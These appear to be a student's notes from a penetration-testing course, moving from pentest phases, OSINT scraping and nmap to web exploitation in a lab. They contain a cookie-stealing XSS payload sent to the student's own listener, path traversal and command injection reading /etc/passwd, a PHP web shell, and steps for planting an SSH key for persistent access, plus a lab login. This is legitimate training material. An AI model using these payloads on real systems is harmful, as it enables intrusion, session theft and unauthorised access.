Stack  USERNAME    PASSWORD        JUMPBOX-IP
13 	ANSP-007-M 	QZozUJFIeaiguQQ 	10.50.33.89
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
CTFD 10.50.20.103:8000
Lin-ops = 192.168.65.20 // 10.50.29.245
Win-ops = 192.168.65.10 // 10.50.32.34
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Penetration Testing
  What is Pen Testing??
    -Pen Testing 
**Phase 1: Mission Definition**
    -Define mission goals and targets
    -Determine scope of mission
    -Define RoE
**Phase 2: Recon**
  -Information gathering about the target through public sources
**Phase 3: Footprinting**
  -Accumulate data through scanning and/or interaction with the target/target resources
**Phase 4: Exploitation & Initial Access**
  -Gain an initial foothold on network
**Phase 5: Post-Exploitation**
    -Establish persistence
    -Escalate privileges
    -Cover your tracks
    -Exfiltrate target data
**Phase 6: Document Mission**
  -Document and report mission details
**Penetration Test Reporting**
  -Operation Notes (OPNOTES) vs Formalized Reporting
**Penetration Test Reporting**
    -Executive Summary
    -Technical Summary
**Penetration Test Reporting**
    -Reasons to report
    -What to report
    -Screen captures
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Vulnerability and Exploitation Research
**Initial Access**
    -What is initial access?
    -What is now the most common method for gaining initial access?                                  
                     Phishing!
**Initial Access**
What are some other techniques to gain initial access?
**Introduction to Exploit Research** password: 
Permission denied,
    Transition from reconnaissance to weaponization
    Leverage intelligence/data about network
    Pair vulnerabilities to exploits
    Align exploits to operational objectives
**Research**
    Open sources
    Organizational capabilities
**Capabilities**
    Mission Objectives drive requirements
        Collection
        Effects
    Additional functionality to fulfill requirements
    Communications security (COMSEC)
**Testing**
    Exploit Development occurs from vulnerability pairing and mission-drivens requirement
        Test and verify success
    Testing provides a number of benefits:
        Faster time to breakout of initial foothold
        Reduced risk of detection and/or tool failure
        Improved recovery times
**Plan**
    Procure Hardware and software
    Assign developer
    Assign a tester to develop TTPs and break it
    Document testing results
    Testing environment
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Network Reconnaisance and Scanning 
**Open Source Intelligence**
During the lesson we will review the following topics:
    Appropriate Documentation Practices
    Use of Collected Data
    Collection Methods
DoD States:
"produced from publicly available information that is collected, exploited, and disseminated in a timely manner to an appropriate audience for addressing a specific intelligence requirement."
**Documentation**
    Why is it important?
    What should we include in documentation?
**Collection and Use**
    What do we want to collect?
    How can it be used in operations?
**Limitations on Collection**
    Are there rules that guide our operations and collection parameters?
    What are important factors when collecting data about a target?
**Data to Collect**
    Web Data
    Sensitive Data
    Publicly Accessible
    Social Media
    Domain and IP Data
**Hyper-Text Markup Language (HTML)**
Standardized markup language for browser interpretation of webpages
    Client-side interpretation (web browser)
    Utilizes elements (identified by tags)
Typically redirects to another page for server-side interaction
Cascading Stylesheets (CSS) for page themeing
**HTML**
DEMO: Simple HTML page
**http://10.50.XX.XX/webexample/htmldemo.html**
Demonstration
Data collection through scraping
Scraping Data
**Prep**
pip install lxml requests
**Script**
#!/usr/bin/python
import lxml.html
import requests
page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)
authors = tree.xpath('//small[@class="author"]/text()')
print ('Authors: ',authors)
**What will it output?**
Authors:  ['Albert Einstein', 'J.K. Rowling', 'Albert Einstein', 'Jane Austen', 'Marilyn Monroe', 'Albert Einstein', u’Andr\xe9 Gide', 'Thomas A. Edison', 'Eleanor Roosevelt', 'Steve Martin']
**Advanced Scanning Techniques**
    Host Discovery
        Find hosts that are online
    Port Enumeration
        Find ports for each host that is online
    Port Interrogation
        Find what service is running on each open/available port     
**Demonstration**
Advanced Scanning Techniques
**NMAP Scripting Engine**
During the lesson we will review the following topics:
    Benefits of Scanning with Scripts
    Script Management and Utilization
    Usage and Examples
**Nmap Project States:**
"(It) allows users to write (and share) simple scripts to automate a wide variety of networking tasks. Those scripts are then executed in parallel with the speed and efficiency you expect from Nmap."
**Benefits**
    Why use scripts, instead of normal scanning options?
    Why are scripts important?
**Main Benefits**
    Network Discovery
    Sophisticated Version Detection
    Vulnerability Detection
    Backdoor Detection
    Vulnerability Exploitation
**Script Management**
Scripts are stored in a subdirectory of the Nmap data directory by default:
/usr/share/nmap/scripts
**Usage and Examples**
nmap --script <filename>|<category>|<directory>
nmap --script-help "ftp-* and discovery"
nmap --script-args <args>
nmap --script-args-file <filename>
nmap --script-help <filename>|<category>|<directory>
nmap --script-trace
**Demonstration**
Usage of Nmap NSE

for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done

Scheme of Maneuver:
>jump box
-> network scan 192.168.28.96/27
--> network scan 192.168.150.224/27
nmap scripts
  --script=http-enum <ip>
  

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Web Exploitation
**Server/Client Relationship**
    Synchronous communications between user and services
    Not all data is not returned, client only receives what is allowed
**Hyper-Text Transfer Protocol (HTTP)**
    Request/Response
        Various tools to view:
            tcpdump
            wireshark
            Developer Console
GET / HTTP/1.1
HTTP/1.1 200 OK
**HTTP Methods**
A Select Few:
    GET
    POST
    HEAD
    PUT
https://tools.ietf.org/html/rfc2616
**HTTP Response Codes**
    10X == Informational
    2XX == Success
    30X == Redirection
    4XX == Client Error
    5XX == Server Error
https://tools.ietf.org/html/rfc2616
**HTTP Packet Headers**
DEMO: Look at a header!
    Open a browser (on your opstation) and enter the Developer Console
**HTTP Fields**
    User-Agent
    Referer
    Cookie
    Date
    Server
    Set-Cookie
**HTTP Method Notes**
GET request can be utilized to pass data to the server using the URL string:
http://10.50.x.x/path/pathdemo.php?myfile=demo1
Wget
    Recursively download
    Recover from broken transfers
    SSL/TLS support
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php
cURL
    Not recursive
    Can use pipes
    Upload ability
    Supports more protocols vs Wget, such as SCP & POP3
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
**JavaScript (JS)**
    Allows websites to interact with the client
        JavaScript runs on the client’s machine
    Coded as .js files, or in-line of HTML
**JS Interaction**
<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>
**JS in action**
DEMO: Lets take a look at Javademo.html
http://10.50.XX.XX/java/Javademo.html
**Developer Console**
(Must be done from opstation!)
**Enumeration**
    Robots.txt   (varwwwhtml)
Legitimate surfing
Tools:
    NSE scripts
    Nikto
    Burp suite (outside class)
**Cross-Site Scripting (XSS) Overview**
    Insertion of arbitrary code into a webpage, that executes in the browser of visitors
    Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
    Often found in forums that allow HTML
**Reflected XSS**
    Most common form of XSS
    Transient, occurs in error messages or search results
    Delivered through intermediate media, such as a link in an email
    Characters that are normally illegal in URLs can be Base64 encoded
Below is what you see, but the server will decode as name=abc123
http://example.com/page.php?name=dXNlcjEyMw
**Stored XSS**
    Resides on vulnerable site
    Only requires user to visit page
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
Useful JavaScript Components
Proof of concept (simple alert):
<script>alert('XSS');</script>
    Capturing Cookies
    document.cookie
    Capturing Keystrokes
        bind keydown and keyup
    Capturing Sensitive Data
    document.body.innerHTML
**Server-Side injection**
Directory Traversal/Path Traversal
    Ability to read/execute outside web server’s directory
    Uses ../../ (relative paths) in manipulating a server-side file path
view_image.php?file=../../etc/passwd
**Malicious File Upload**
Site allows unsanitized file uploads
    Server doesn’t validate extension or size
    Allows for code execution (shell)
    Once uploaded
        Find your file
        Call your file
**Command Injection**
Application on the server is vulnerable,
allowing execution of arbitrary commands
    User input not validated
        Common example is a SOHO router, with a web page to allow ping
Might contain the following in it’s code:
system("ping -c 1 ".$_GET["ip"]);
Run the following to chain/stack our arbitrary command
; cat /etc/passwd

 <script>document.location="http://lin-op:8000"/+document.cookie;</script>
python3 -m http.server

  <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>


Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system. By uploading our key to the target, we can give ourselves access without needing a password.
**SSH Key Setup**
    **Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well**
     ssh-keygen -t rsa -b 4096
   **After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension**
     cat ~/.ssh/id_rsa.pub
    **Find out what account is running the web sever/commands.**
     whoami
    **Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.**
     www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.
   **Check to see if .ssh folder is in the users home directory. If not make it**
     ls -la /users/home/directory      #check if .ssh exist
     mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
   **Echo ssh key to the authorized_keys file in the users .ssh folder.**
     echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
    **Verify key has been uploaded successfully.**
     cat /users/home/directory/.ssh/authorized_keys
Once this process has be finished you should now be able to ssh on the target system as the user who is running the web server. If prompted for a password something has gone wrong.

uploads
robots.txt

xfreerdp /V ip:pt /u:user /p:password +clipboard 








































































































































































































































































































































































































































































































































































